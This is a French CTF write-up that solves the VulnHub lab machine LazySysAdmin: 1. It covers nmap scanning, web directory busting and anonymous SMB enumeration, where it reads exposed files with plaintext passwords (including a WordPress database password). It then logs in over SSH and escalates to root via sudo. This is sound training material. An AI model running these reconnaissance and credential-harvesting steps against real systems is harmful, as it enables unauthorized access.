# Solution du CTF LazySysAdmin: 1 de VulnHub

Intro
-----

[Yet another challenge](https://www.vulnhub.com/entry/lazysysadmin-1,205/) from *VulnHub*.  

Pour l'utiliser dans VirtualBox j'ai du convertir l'image disque VMDK vers le format VDI :   

```plain
VBoxManage clonehd --format VDI Lazysysadmin-disk1.vmdk  Lazysysadmin.vdi
```

One for Nmap
------------

```plain
Nmap scan report for 192.168.1.49
Host is up (0.0020s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey:
|   1024 b5:38:66:0f:a1:ee:cd:41:69:3b:82:cf:ad:a1:f7:13 (DSA)
|   2048 58:5a:63:69:d0:da:dd:51:cc:c1:6e:00:fd:7e:61:d0 (RSA)
|_  256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA)
80/tcp   open  http
|_http-generator: Silex v2.2.7
| http-robots.txt: 4 disallowed entries
|_/old/ /test/ /TR2/ /Backnode_files/
|_http-title: Backnode
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
6667/tcp open  irc
| irc-info:
|   server: Admin.local
|   users: 1
|   servers: 1
|   chans: 0
|   lusers: 1
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.1.47
|_  error: Closing link: (nmap@192.168.1.47) [Client exited]
MAC Address: 08:00:27:8C:2F:EA (Oracle VirtualBox virtual NIC)

Host script results:
|_nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: lazysysadmin
|   NetBIOS computer name: LAZYSYSADMIN
|   Domain name:
|   FQDN: lazysysadmin
|_  System time: 2017-10-21T01:34:14+10:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol

Nmap done: 1 IP address (1 host up) scanned in 202.15 seconds
```

On a ici un SMB, un SSh, un MySQL, un IRC ainsi qu'un serveur Apache exposés. Plusieurs entrées dans le robots.txt mais aucune ne sévère intéressante.  

Two for web-buster
------------------

```plain
Starting buster processes...
http://192.168.1.49/.htpasswd/ - HTTP 403 (289 bytes, plain)
http://192.168.1.49/.htaccess/ - HTTP 403 (289 bytes, plain)
http://192.168.1.49/apache/ - HTTP 200 (399 bytes, gzip) - Directory listing found
http://192.168.1.49/icons/ - HTTP 403 (285 bytes, plain)
http://192.168.1.49/javascript/ - HTTP 403 (290 bytes, plain)
http://192.168.1.49/old/ - HTTP 200 (399 bytes, gzip) - Directory listing found
http://192.168.1.49/phpmyadmin/ - HTTP 200 (2699 bytes, gzip)
http://192.168.1.49/server-status/ - HTTP 403 (293 bytes, plain)
http://192.168.1.49/test/ - HTTP 200 (403 bytes, gzip) - Directory listing found
http://192.168.1.49/wp/ - HTTP 200 (399 bytes, gzip) - Directory listing found
100% - DONE
Duration: 0:00:11.177010
```

A posteriori le buster aurait du trouver un dossier */wordpress/* mais ce n'est pas bien grave comme le montre...

Three for anonymous SMB
-----------------------

On utilise l'option -L de *smbclient* pour lister les partages SMB.  

```plain
$ smbclient -L LAZYSYSADMIN -I 192.168.1.49 -U "" -N
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        share$          Disk      Sumshare
        IPC$            IPC       IPC Service (Web server)
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]

        Server               Comment
        ---------            -------
        LAZYSYSADMIN         Web server
```

Puis on tente une connexion au partage share$ en connexion anonyme :   

```plain
$ smbclient -I 192.168.1.49 -U "" -N '//LAZYSYSADMIN/share$'                
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]
smb: \> ls
  .                                   D        0  Tue Aug 15 13:05:52 2017
  ..                                  D        0  Mon Aug 14 14:34:47 2017
  wordpress                           D        0  Wed Oct 25 17:53:49 2017
  Backnode_files                      D        0  Mon Aug 14 14:08:26 2017
  wp                                  D        0  Tue Aug 15 12:51:23 2017
  deets.txt                           N      139  Mon Aug 14 14:20:05 2017
  robots.txt                          N       92  Mon Aug 14 14:36:14 2017
  todolist.txt                        N       79  Mon Aug 14 14:39:56 2017
  apache                              D        0  Mon Aug 14 14:35:19 2017
  index.html                          N    36072  Sun Aug  6 07:02:15 2017
  info.php                            N       20  Tue Aug 15 12:55:19 2017
  test                                D        0  Mon Aug 14 14:35:10 2017
  old                                 D        0  Mon Aug 14 14:35:13 2017

                3029776 blocks of size 1024. 1457228 blocks available
```

On peut aussi juste ouvrir un Nautilus (ou n'importe quel autre explorateur de fichier gérant SMB) et lui passer l'adresse smb://lazysysadmin puis choisir la connexion anonyme.  

On trouve plusieurs fichiers comme *todolist.txt* qui a le contenu suivant :  

> Prevent users from being able to view to web root using the local file browser

Ou encore *deets.txt* avec le contenu :  

> CBF Remembering all these passwords.
> 
> Remember to remove this file and update your password after we push out the server.
> 
> Password 12345

On trouve aussi un dossier *wordpress* avec son *wp-config.php* :   

```php
wordpress/wp-config.php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'Admin');

/** MySQL database password */
define('DB_PASSWORD', 'TogieMYSQL12345^^');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

Lazyadmin is Lazy
-----------------

Quand on se rend sur le wordpress on note quelques éléments :  

* Le nom du blog est *Web\_TR2*
* Un post indique *My name is togie*
* Il y a une adresse qui est *Straya*

Et si on testait le password *12345* vu dans le fichier texte ?  

```plain
$ ssh togie@192.168.1.49
The authenticity of host '192.168.1.49 (192.168.1.49)' can't be established.
ECDSA key fingerprint is SHA256:pHi3EZCmITZrakf7q4RvD2wzkKqmJF0F/SIhYcFzkOI.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.1.49' (ECDSA) to the list of known hosts.
##################################################################################################
#                                          Welcome to Web_TR1                                    #
#                             All connections are monitored and recorded                         #
#                    Disconnect IMMEDIATELY if you are not an authorized user!                   #
##################################################################################################

togie@192.168.1.49's password:
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Thu Oct 21 01:29:31 AEST 2017

  System load: 0.0               Memory usage: 1%   Processes:       103
  Usage of /:  46.2% of 2.89GB   Swap usage:   0%   Users logged in: 0

  Graph this data and manage this system at:
    https://landscape.canonical.com/

133 packages can be updated.
0 updates are security updates.

togie@LazySysAdmin:~$ ls .b-rbash: /dev/null: restricted: cannot redirect output
bash: _upvars: `-a2': invalid number specifier
-rbash: /dev/null: restricted: cannot redirect output
bash: _upvars: `-a0': invalid number specifier
```

On a donc un shell avec le mot de passe *12345*. L'utilisateur est dans un rbash qui est apparu quand on a voulu utiliser la complétion. Cette info se confirme par cette entrée du fichier *passwd* :  

```plain
togie:x:1000:1000:togie,,,:/home/togie:/bin/rbash
```

Mais pour le moment il ne nous dérange pas plus que ça...  

Il y a un utilisateur irc qui fait tourner un démon InspIRCd :  

```plain
irc       1001  0.0  0.2   6652  5424 ?        Ss   01:29   0:00 /usr/sbin/inspircd --logfile /var/log/inspircd.log --config /etc/inspircd/inspircd.conf start
```

Le répertoire correspondant au démon dans /etc n'est pas accessible :  

```plain
drwxrwx--- 2 irc  irc     4096 Aug 14 20:40 inspircd
```

Par contre le fichier de log est accessible aux membres du groupe adm :  

```plain
togie@LazySysAdmin:~$ ls -l /var/log/inspircd.log
-rw-r----- 1 irc adm 54782 Oct 21 01:34 /var/log/inspircd.log
```

D'ailleurs de quels groupes faisons nous partie ?  

```plain
togie@LazySysAdmin:~$ grep togie /etc/group
adm:x:4:syslog,togie
cdrom:x:24:togie
sudo:x:27:togie
dip:x:30:togie
plugdev:x:46:togie
togie:x:1000:
lpadmin:x:110:togie
sambashare:x:111:togie
```

On fait partie du groupe *sudo*... Intéressant.  

Five for the root
-----------------

```plain
togie@LazySysAdmin:~$ sudo -l
[sudo] password for togie:
Matching Defaults entries for togie on LazySysAdmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User togie may run the following commands on LazySysAdmin:
    (ALL : ALL) ALL
```

Ce fut rapide !  

```plain
togie@LazySysAdmin:~$ sudo /bin/bash
root@LazySysAdmin:~# cd /root
root@LazySysAdmin:/root# ls
proof.txt
root@LazySysAdmin:/root# cat proof.txt
WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851

Well done :)

Hope you learn't a few things along the way.

Regards,

Togie Mcdogie

Enjoy some random strings

WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851
2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7
pf%&1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02
bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu
```

Au passage dans le fichier de log d'InspIRCd on trouve cela :  

```plain
<oper name="root"
      password="12345"
      host="*@localhost"
      type="NetAdmin">
```

Une autre solution aurait été à priori de bruteforcer les acocunts IRC.  

C'était vraiment facile et du coup je m'interroge sur l'utilité du restricted bash ^\_^  


*Published October 26 2017 at 18:35*